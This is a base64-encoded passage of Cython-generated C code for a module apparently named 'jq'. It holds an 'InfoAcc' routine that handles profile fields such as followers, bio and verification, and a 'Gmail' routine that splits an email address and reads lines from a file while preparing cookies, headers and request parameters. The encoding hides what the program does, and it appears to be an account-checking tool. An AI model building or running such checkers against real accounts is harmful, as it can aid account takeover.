ICAge1xuICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8xNiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2hlfTtcbiAgICAgICAgX19weXhfdF8yMSA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfMTUsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNSwgKDItX19weXhfdF81KSB8IChfX3B5eF90XzUqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xNik7IF9fcHl4X3RfMTYgPSAwO1xuICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xNSk7IF9fcHl4X3RfMTUgPSAwO1xuICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMjEpKSBfX1BZWF9FUlIoMCwgMjk4LCBfX3B5eF9MMzNfZXhjZXB0X2Vycm9yKVxuICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8yMSk7XG4gICAgICB9XG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8yMSk7IF9fcHl4X3RfMjEgPSAwO1xuICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzE3KTsgX19weXhfdF8xNyA9IDA7XG4gICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTgpOyBfX3B5eF90XzE4ID0gMDtcbiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xOSk7IF9fcHl4X3RfMTkgPSAwO1xuICAgICAgZ290byBfX3B5eF9MMzJfZXhjZXB0aW9uX2hhbmRsZWQ7XG4gICAgfVxuXG4gICAgXG4gICAgX19weXhfTDMzX2V4Y2VwdF9lcnJvcjo7XG4gICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF84KTtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzIyKTtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzYpO1xuICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfOCwgX19weXhfdF8yMiwgX19weXhfdF82KTtcbiAgICBnb3RvIF9fcHl4X0wxX2Vycm9yO1xuICAgIF9fcHl4X0wzMl9leGNlcHRpb25faGFuZGxlZDo7XG4gICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF84KTtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzIyKTtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzYpO1xuICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfOCwgX19weXhfdF8yMiwgX19weXhfdF82KTtcbiAgICBfX3B5eF9MMzZfdHJ5X2VuZDo7XG4gIH1cblxuICBcblxuICBcbiAgX19weXhfciA9IFB5X05vbmU7IF9fUHl4X0lOQ1JFRihQeV9Ob25lKTtcbiAgZ290byBfX3B5eF9MMDtcbiAgX19weXhfTDFfZXJyb3I6O1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMSk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzMpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMSk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMik7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMyk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF8xNCk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF8xNSk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF8xNik7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF8xNyk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF8xOCk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF8xOSk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF8yMSk7XG4gIF9fUHl4X0FkZFRyYWNlYmFjaygianEuSW5mb0FjYyIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpO1xuICBfX3B5eF9yID0gTlVMTDtcbiAgX19weXhfTDA6O1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfcnIpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfSWQpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfZnVsbF9uYW1lKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF92X2Zvd3MpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfZm93Zyk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdl9wcCk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdl9pc1ByYWlzZSk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdl9iaW8pO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfaXNfdmVyaWZpZWQpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfYml6eik7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdl9zcyk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdl9maWxlKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF92X2UpO1xuICBfX1B5eF9YR0lWRVJFRihfX3B5eF9yKTtcbiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7XG4gIHJldHVybiBfX3B5eF9yO1xufVxuXG5cblxuXG5zdGF0aWMgUHlPYmplY3QgKl9fcHl4X3B3XzJqcV8xMUdtYWlsKFB5T2JqZWN0ICpfX3B5eF9zZWxmLCBcbiNpZiBDWVRIT05fTUVUSF9GQVNUQ0FMTFxuUHlPYmplY3QgKmNvbnN0ICpfX3B5eF9hcmdzLCBQeV9zc2l6ZV90IF9fcHl4X25hcmdzLCBQeU9iamVjdCAqX19weXhfa3dkc1xuI2Vsc2VcblB5T2JqZWN0ICpfX3B5eF9hcmdzLCBQeU9iamVjdCAqX19weXhfa3dkc1xuI2VuZGlmXG4pOyBcbnN0YXRpYyBQeU1ldGhvZERlZiBfX3B5eF9tZGVmXzJqcV8xMUdtYWlsID0geyJHbWFpbCIsIChQeUNGdW5jdGlvbikodm9pZCgqKSh2b2lkKSkoX19QeXhfUHlDRnVuY3Rpb25fRmFzdENhbGxXaXRoS2V5d29yZHMpX19weXhfcHdfMmpxXzExR21haWwsIF9fUHl4X01FVEhfRkFTVENBTEx8TUVUSF9LRVlXT1JEUywgMH07XG5zdGF0aWMgUHlPYmplY3QgKl9fcHl4X3B3XzJqcV8xMUdtYWlsKFB5T2JqZWN0ICpfX3B5eF9zZWxmLCBcbiNpZiBDWVRIT05fTUVUSF9GQVNUQ0FMTFxuUHlPYmplY3QgKmNvbnN0ICpfX3B5eF9hcmdzLCBQeV9zc2l6ZV90IF9fcHl4X25hcmdzLCBQeU9iamVjdCAqX19weXhfa3dkc1xuI2Vsc2VcblB5T2JqZWN0ICpfX3B5eF9hcmdzLCBQeU9iamVjdCAqX19weXhfa3dkc1xuI2VuZGlmXG4pIHtcbiAgUHlPYmplY3QgKl9fcHl4X3ZfZW1haWwgPSAwO1xuICAjaWYgIUNZVEhPTl9NRVRIX0ZBU1RDQUxMXG4gIENZVEhPTl9VTlVTRUQgUHlfc3NpemVfdCBfX3B5eF9uYXJncztcbiAgI2VuZGlmXG4gIENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKmNvbnN0ICpfX3B5eF9rd3ZhbHVlcztcbiAgUHlPYmplY3QqIHZhbHVlc1sxXSA9IHswfTtcbiAgaW50IF9fcHl4X2xpbmVubyA9IDA7XG4gIGNvbnN0IGNoYXIgKl9fcHl4X2ZpbGVuYW1lID0gTlVMTDtcbiAgaW50IF9fcHl4X2NsaW5lbm8gPSAwO1xuICBQeU9iamVjdCAqX19weXhfciA9IDA7XG4gIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zXG4gIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJHbWFpbCAod3JhcHBlcikiLCAwKTtcbiAgI2lmICFDWVRIT05fTUVUSF9GQVNUQ0FMTFxuICAjaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkVcbiAgX19weXhfbmFyZ3MgPSBQeVR1cGxlX0dFVF9TSVpFKF9fcHl4X2FyZ3MpO1xuICAjZWxzZVxuICBfX3B5eF9uYXJncyA9IFB5VHVwbGVfU2l6ZShfX3B5eF9hcmdzKTsgaWYgKHVubGlrZWx5KF9fcHl4X25hcmdzIDwgMCkpIHJldHVybiBOVUxMO1xuICAjZW5kaWZcbiAgI2VuZGlmXG4gIF9fcHl4X2t3dmFsdWVzID0gX19QeXhfS3dWYWx1ZXNfRkFTVENBTEwoX19weXhfYXJncywgX19weXhfbmFyZ3MpO1xuICB7XG4gICAgUHlPYmplY3QgKiogY29uc3QgX19weXhfcHlhcmduYW1lc1tdID0geyZfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZW1haWwsMH07XG4gICAgY29uc3QgUHlfc3NpemVfdCBfX3B5eF9rd2RzX2xlbiA9IChfX3B5eF9rd2RzKSA/IF9fUHl4X051bUt3YXJnc19GQVNUQ0FMTChfX3B5eF9rd2RzKSA6IDA7XG4gICAgaWYgKHVubGlrZWx5KF9fcHl4X2t3ZHNfbGVuKSA8IDApIF9fUFlYX0VSUigwLCAzMDEsIF9fcHl4X0wzX2Vycm9yKVxuICAgIGlmIChfX3B5eF9rd2RzX2xlbiA+IDApIHtcbiAgICAgIHN3aXRjaCAoX19weXhfbmFyZ3MpIHtcbiAgICAgICAgY2FzZSAgMTpcbiAgICAgICAgdmFsdWVzWzBdID0gX19QeXhfQXJnUmVmX0ZBU1RDQUxMKF9fcHl4X2FyZ3MsIDApO1xuICAgICAgICBpZiAoIUNZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgdW5saWtlbHkoIXZhbHVlc1swXSkpIF9fUFlYX0VSUigwLCAzMDEsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICBDWVRIT05fRkFMTFRIUk9VR0g7XG4gICAgICAgIGNhc2UgIDA6IGJyZWFrO1xuICAgICAgICBkZWZhdWx0OiBnb3RvIF9fcHl4X0w1X2FyZ3R1cGxlX2Vycm9yO1xuICAgICAgfVxuICAgICAgY29uc3QgUHlfc3NpemVfdCBrd2RfcG9zX2FyZ3MgPSBfX3B5eF9uYXJncztcbiAgICAgIGlmIChfX1B5eF9QYXJzZUtleXdvcmRzKF9fcHl4X2t3ZHMsIF9fcHl4X2t3dmFsdWVzLCBfX3B5eF9weWFyZ25hbWVzLCAwLCB2YWx1ZXMsIGt3ZF9wb3NfYXJncywgX19weXhfa3dkc19sZW4sICJHbWFpbCIsIDApIDwgKDApKSBfX1BZWF9FUlIoMCwgMzAxLCBfX3B5eF9MM19lcnJvcilcbiAgICAgIGZvciAoUHlfc3NpemVfdCBpID0gX19weXhfbmFyZ3M7IGkgPCAxOyBpKyspIHtcbiAgICAgICAgaWYgKHVubGlrZWx5KCF2YWx1ZXNbaV0pKSB7IF9fUHl4X1JhaXNlQXJndHVwbGVJbnZhbGlkKCJHbWFpbCIsIDEsIDEsIDEsIGkpOyBfX1BZWF9FUlIoMCwgMzAxLCBfX3B5eF9MM19lcnJvcikgfVxuICAgICAgfVxuICAgIH0gZWxzZSBpZiAodW5saWtlbHkoX19weXhfbmFyZ3MgIT0gMSkpIHtcbiAgICAgIGdvdG8gX19weXhfTDVfYXJndHVwbGVfZXJyb3I7XG4gICAgfSBlbHNlIHtcbiAgICAgIHZhbHVlc1swXSA9IF9fUHl4X0FyZ1JlZl9GQVNUQ0FMTChfX3B5eF9hcmdzLCAwKTtcbiAgICAgIGlmICghQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiB1bmxpa2VseSghdmFsdWVzWzBdKSkgX19QWVhfRVJSKDAsIDMwMSwgX19weXhfTDNfZXJyb3IpXG4gICAgfVxuICAgIF9fcHl4X3ZfZW1haWwgPSB2YWx1ZXNbMF07XG4gIH1cbiAgZ290byBfX3B5eF9MNl9za2lwO1xuICBfX3B5eF9MNV9hcmd0dXBsZV9lcnJvcjo7XG4gIF9fUHl4X1JhaXNlQXJndHVwbGVJbnZhbGlkKCJHbWFpbCIsIDEsIDEsIDEsIF9fcHl4X25hcmdzKTsgX19QWVhfRVJSKDAsIDMwMSwgX19weXhfTDNfZXJyb3IpXG4gIF9fcHl4X0w2X3NraXA6O1xuICBnb3RvIF9fcHl4X0w0X2FyZ3VtZW50X3VucGFja2luZ19kb25lO1xuICBfX3B5eF9MM19lcnJvcjo7XG4gIGZvciAoUHlfc3NpemVfdCBfX3B5eF90ZW1wPTA7IF9fcHl4X3RlbXAgPCAoUHlfc3NpemVfdCkoc2l6ZW9mKHZhbHVlcykvc2l6ZW9mKHZhbHVlc1swXSkpOyArK19fcHl4X3RlbXApIHtcbiAgICBQeV9YREVDUkVGKHZhbHVlc1tfX3B5eF90ZW1wXSk7XG4gIH1cbiAgX19QeXhfQWRkVHJhY2ViYWNrKCJqcS5HbWFpbCIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpO1xuICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTtcbiAgcmV0dXJuIE5VTEw7XG4gIF9fcHl4X0w0X2FyZ3VtZW50X3VucGFja2luZ19kb25lOjtcbiAgX19weXhfciA9IF9fcHl4X3BmXzJqcV8xMEdtYWlsKF9fcHl4X3NlbGYsIF9fcHl4X3ZfZW1haWwpO1xuXG4gIFxuICBmb3IgKFB5X3NzaXplX3QgX19weXhfdGVtcD0wOyBfX3B5eF90ZW1wIDwgKFB5X3NzaXplX3QpKHNpemVvZih2YWx1ZXMpL3NpemVvZih2YWx1ZXNbMF0pKTsgKytfX3B5eF90ZW1wKSB7XG4gICAgUHlfWERFQ1JFRih2YWx1ZXNbX19weXhfdGVtcF0pO1xuICB9XG4gIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpO1xuICByZXR1cm4gX19weXhfcjtcbn1cblxuc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9wZl8yanFfMTBHbWFpbChDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpfX3B5eF9zZWxmLCBQeU9iamVjdCAqX19weXhfdl9lbWFpbCkge1xuICBQeU9iamVjdCAqX19weXhfdl9vID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3ZfdGwgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdl9ob3N0ID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3ZfY29va2llcyA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF92X2hlYWRlcnMgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdl9wYXJhbXMgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdl9kYXRhID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3ZfcmVzcG9uc2UgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdl9vayA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF92X3VzZXJuYW1lID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3ZfZ2cgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfciA9IE5VTEw7XG4gIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zXG4gIFB5T2JqZWN0ICpfX3B5eF90XzEgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF8yID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfMyA9IE5VTEw7XG4gIGludCBfX3B5eF90XzQ7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzUgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF82ID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfNyA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzggPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF85ID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfMTAgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF8xMSA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzEyID0gTlVMTDtcbiAgc2l6ZV90IF9fcHl4X3RfMTM7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzE0ID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfMTUgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF8xNiA9IE5VTEw7XG4gIFB5T2JqZWN0ICooKl9fcHl4X3RfMTcpKFB5T2JqZWN0ICopO1xuICBpbnQgX19weXhfbGluZW5vID0gMDtcbiAgY29uc3QgY2hhciAqX19weXhfZmlsZW5hbWUgPSBOVUxMO1xuICBpbnQgX19weXhfY2xpbmVubyA9IDA7XG4gIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJHbWFpbCIsIDApO1xuICBfX1B5eF9JTkNSRUYoX19weXhfdl9lbWFpbCk7XG5cbiAgXG4gIHtcbiAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2RlY2xhcmVcbiAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2Fzc2lnblxuICAgIF9fUHl4X0V4Y2VwdGlvblNhdmUoJl9fcHl4X3RfMSwgJl9fcHl4X3RfMiwgJl9fcHl4X3RfMyk7XG4gICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzEpO1xuICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8yKTtcbiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMyk7XG4gICAgIHtcblxuICAgICAgXG4gICAgICBfX3B5eF90XzQgPSAoX19QeXhfUHlTZXF1ZW5jZV9Db250YWluc1RGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfXzIwLCBfX3B5eF92X2VtYWlsLCBQeV9FUSkpOyBpZiAodW5saWtlbHkoKF9fcHl4X3RfNCA8IDApKSkgX19QWVhfRVJSKDAsIDMwNCwgX19weXhfTDNfZXJyb3IpXG4gICAgICBpZiAoX19weXhfdF80KSB7XG5cbiAgICAgICAgXG4gICAgICAgIF9fcHl4X3RfNSA9IF9fUHl4X1B5T2JqZWN0X1VuaWNvZGUoX19weXhfdl9lbWFpbCk7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDMwNSwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpO1xuICAgICAgICBfX3B5eF90XzYgPSBQeVVuaWNvZGVfU3BsaXQoKChQeU9iamVjdCopX19weXhfdF81KSwgX19QeXhfTm9uZUFzTnVsbChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X18yMCksIC0xTCk7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDMwNSwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpO1xuICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICAgICAgX19weXhfdF81ID0gX19QeXhfR2V0SXRlbUludF9MaXN0KF9fcHl4X3RfNiwgMCwgbG9uZywgMSwgX19QeXhfUHlMb25nX0Zyb21fbG9uZywgMSwgMCwgMSwgMSk7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDMwNSwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpO1xuICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDtcbiAgICAgICAgX19QeXhfREVDUkVGX1NFVChfX3B5eF92X2VtYWlsLCBfX3B5eF90XzUpO1xuICAgICAgICBfX3B5eF90XzUgPSAwO1xuXG4gICAgICAgIFxuICAgICAgfVxuXG4gICAgICBcbiAgICAgIHtcbiAgICAgICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9kZWNsYXJlXG4gICAgICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfYXNzaWduXG4gICAgICAgIF9fUHl4X0V4Y2VwdGlvblNhdmUoJl9fcHl4X3RfNywgJl9fcHl4X3RfOCwgJl9fcHl4X3RfOSk7XG4gICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF83KTtcbiAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzgpO1xuICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfOSk7XG4gICAgICAgICB7XG5cbiAgICAgICAgICBcbiAgICAgICAgICBfX3B5eF90XzEyID0gX19QeXhfUHlPYmplY3RfQ2FsbChfX3B5eF9idWlsdGluX29wZW4sIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzE2XSwgTlVMTCk7IGlmICh1bmxpa2VseSghX19weXhfdF8xMikpIF9fUFlYX0VSUigwLCAzMDgsIF9fcHl4X0wxMF9lcnJvcilcbiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMik7XG4gICAgICAgICAgX19weXhfdF8xMSA9IF9fcHl4X3RfMTI7XG4gICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMTEpO1xuICAgICAgICAgIF9fcHl4X3RfMTMgPSAwO1xuICAgICAgICAgIHtcbiAgICAgICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzExLCBOVUxMfTtcbiAgICAgICAgICAgIF9fcHl4X3RfMTAgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbE1ldGhvZChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmVhZCwgX19weXhfY2FsbGFyZ3MrX19weXhfdF8xMywgKDEtX19weXhfdF8xMykgfCAoMSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMSk7IF9fcHl4X3RfMTEgPSAwO1xuICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTIpOyBfX3B5eF90XzEyID0gMDtcbiAgICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8xMCkpIF9fUFlYX0VSUigwLCAzMDgsIF9fcHl4X0wxMF9lcnJvcilcbiAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEwKTtcbiAgICAgICAgICB9XG4gICAgICAgICAgX19weXhfdF82ID0gX19weXhfdF8xMDtcbiAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF82KTtcbiAgICAgICAgICBfX3B5eF90XzEzID0gMDtcbiAgICAgICAgICB7XG4gICAgICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF82LCBOVUxMfTtcbiAgICAgICAgICAgIF9fcHl4X3RfNSA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsTWV0aG9kKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zcGxpdGxpbmVzLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzEzLCAoMS1fX3B5eF90XzEzKSB8ICgxKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwO1xuICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDtcbiAgICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDMwOCwgX19weXhfTDEwX2Vycm9yKVxuICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7XG4gICAgICAgICAgfVxuICAgICAgICAgIF9fcHl4X3RfMTAgPSBfX1B5eF9HZXRJdGVtSW50KF9fcHl4X3RfNSwgMCwgbG9uZywgMSwgX19QeXhfUHlMb25nX0Zyb21fbG9uZywgMCwgMCwgMSwgMSk7IGlmICh1bmxpa2VseSghX19weXhfdF8xMCkpIF9fUFlYX0VSUigwLCAzMDgsIF9fcHl4X0wxMF9lcnJvcilcbiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMCk7XG4gICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgICAgICAgX19weXhfdl9vID0gX19weXhfdF8xMDtcbiAgICAgICAgICBfX3B5eF90XzEwID0gMDtcblxuICAgICAgICAgIFxuICAgICAgICB9XG4gICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDtcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwO1xuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOSk7IF9fcHl4X3RfOSA9IDA7XG4gICAgICAgIGdvdG8gX19weXhfTDE1X3RyeV9lbmQ7XG4gICAgICAgIF9fcHl4X0wxMF9lcnJvcjo7XG4gICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwO1xuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTEpOyBfX3B5eF90XzExID0gMDtcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEyKTsgX19weXhfdF8xMiA9IDA7XG4gICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwO1xuXG4gICAgICAgIFxuICAgICAgICAge1xuICAgICAgICAgIF9fUHl4X0FkZFRyYWNlYmFjaygianEuR21haWwiLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTtcbiAgICAgICAgICBpZiAoX19QeXhfR2V0RXhjZXB0aW9uKCZfX3B5eF90XzEwLCAmX19weXhfdF81LCAmX19weXhfdF82KSA8IDApIF9fUFlYX0VSUigwLCAzMDksIF9fcHl4X0wxMl9leGNlcHRfZXJyb3IpXG4gICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzEwKTtcbiAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNSk7XG4gICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzYpO1xuXG4gICAgICAgICAgXG4gICAgICAgICAgX19weXhfdF8xNiA9IF9fUHl4X1B5T2JqZWN0X0NhbGwoX19weXhfYnVpbHRpbl9vcGVuLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsxNl0sIE5VTEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTYpKSBfX1BZWF9FUlIoMCwgMzEwLCBfX3B5eF9MMTJfZXhjZXB0X2Vycm9yKVxuICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzE2KTtcbiAgICAgICAgICBfX3B5eF90XzE1ID0gX19weXhfdF8xNjtcbiAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF8xNSk7XG4gICAgICAgICAgX19weXhfdF8xMyA9IDA7XG4gICAgICAgICAge1xuICAgICAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfMTUsIE5VTEx9O1xuICAgICAgICAgICAgX19weXhfdF8xNCA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsTWV0aG9kKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yZWFkLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzEzLCAoMS1fX3B5eF90XzEzKSB8ICgxKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzE1KTsgX19weXhfdF8xNSA9IDA7XG4gICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xNik7IF9fcHl4X3RfMTYgPSAwO1xuICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzE0KSkgX19QWVhfRVJSKDAsIDMxMCwgX19weXhfTDEyX2V4Y2VwdF9lcnJvcilcbiAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzE0KTtcbiAgICAgICAgICB9XG4gICAgICAgICAgX19weXhfdF8xMSA9IF9fcHl4X3RfMTQ7XG4gICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMTEpO1xuICAgICAgICAgIF9fcHl4X3RfMTMgPSAwO1xuICAgICAgICAgIHtcbiAgICAgICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzExLCBOVUxMfTtcbiAgICAgICAgICAgIF9fcHl4X3RfMTIgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbE1ldGhvZChfX3B5eF9tc